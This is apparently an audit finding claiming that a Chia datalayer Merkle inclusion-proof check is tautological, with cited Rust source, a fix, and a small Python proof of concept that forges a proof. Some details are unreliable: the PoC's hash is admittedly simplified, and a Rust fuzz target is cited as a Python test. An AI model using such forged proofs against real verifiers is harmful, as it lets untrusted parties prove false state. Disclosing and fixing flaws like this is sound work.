### Title
`ProofOfInclusion::valid()` Uses Stored `combined_hash` Instead of External Root — Forged Inclusion Proof Always Passes - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

---

### Summary

`ProofOfInclusion::valid()` compares the final computed hash against `self.root_hash()`, which returns the stored `last.combined_hash` from the proof's own layer list. Because the loop already guarantees `existing_hash == last.combined_hash` before the final comparison, the check is a tautology. Any `ProofOfInclusion` with internally self-consistent (but entirely fabricated) hashes passes `valid()`, allowing an attacker to forge DataLayer inclusion proofs for arbitrary key-value pairs.

---

### Finding Description

`ProofOfInclusion::valid()` is the sole public API for verifying a DataLayer Merkle inclusion proof:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← existing_hash := layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true: both sides == last.combined_hash
}
``` [1](#0-0) 

`root_hash()` returns the stored field from the proof itself:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← stored value, not recomputed
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop body executes `existing_hash = calculated_hash` and the check `calculated_hash != layer.combined_hash` passes, `existing_hash` is definitionally equal to `last.combined_hash`. The final line `existing_hash == self.root_hash()` therefore reduces to `last.combined_hash == last.combined_hash`, which is always `true`. The function never compares against an externally trusted root hash.

This is the direct analog of the external report: `root_hash()` returns a **stored field** (`last.combined_hash`) instead of a **dynamically computed** value derived from an external trusted source, making the validation self-referential and meaningless as a security check.

`ProofOfInclusion` is `Streamable` and exposed to Python via `from_bytes` / `from_json_dict`: [3](#0-2) [4](#0-3) 

An attacker can construct an arbitrary `ProofOfInclusion` in bytes, deserialize it, and have `valid()` return `true`.

---

### Impact Explanation

Any DataLayer verifier that calls `proof.valid()` as its sole check — which is the documented and tested usage pattern — will accept a forged proof claiming inclusion of any key-value pair in any tree. The attacker controls both `node_hash` (the claimed leaf) and the fabricated `combined_hash` chain. The Python test suite itself uses `assert proof_of_inclusion.valid()` as the complete verification: [5](#0-4) 

This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, letting untrusted input prove invalid state.**

---

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type with Python bindings, meaning any network peer or untrusted party can supply a crafted proof blob. The DataLayer's primary use case is proving key-value membership to third parties who receive proofs over the network. Those verifiers call `valid()` as the complete check. The bug requires no privileged access, no key material, and no chain state — only the ability to construct a self-consistent hash chain, which is trivially computable.

---

### Recommendation

`valid()` must accept an externally trusted root hash and compare against it, not against the stored field:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == *expected_root   // compare against trusted external root
}
```

`root_hash()` may remain as a convenience accessor for callers who need to extract the claimed root, but it must not be used inside `valid()` as the ground truth.

---

### Proof of Concept

```python
from chia_rs import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Craft a leaf hash for a key-value pair that does NOT exist in any real tree
fake_leaf = bytes([0xAB] * 32)

# Build one layer: combined_hash = sha256(fake_leaf || fake_sibling)
# using the real calculate_internal_hash logic (left side)
fake_sibling = bytes([0xCD] * 32)
combined = hashlib.sha256(b'\x00' + fake_leaf + fake_sibling).digest()  # simplified

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # Right side
    other_hash=fake_sibling,
    combined_hash=combined,     # attacker sets this to match their computation
)

proof = ProofOfInclusion(node_hash=fake_leaf, layers=[layer])

# valid() compares existing_hash (== combined) against root_hash() (== combined)
# → always True, regardless of whether fake_leaf is in any real tree
assert proof.valid()   # passes — forged proof accepted
print("root claimed by forged proof:", proof.root_hash().hex())
```

The forged proof passes `valid()` because the final comparison is `combined == combined` — the stored `combined_hash` field is used instead of an externally provided trusted root hash.

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L13-29)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs (L28-31)
```rust
    for key in keys {
        let proof = blob.get_proof_of_inclusion(key).unwrap();
        assert!(proof.valid());
    }
```
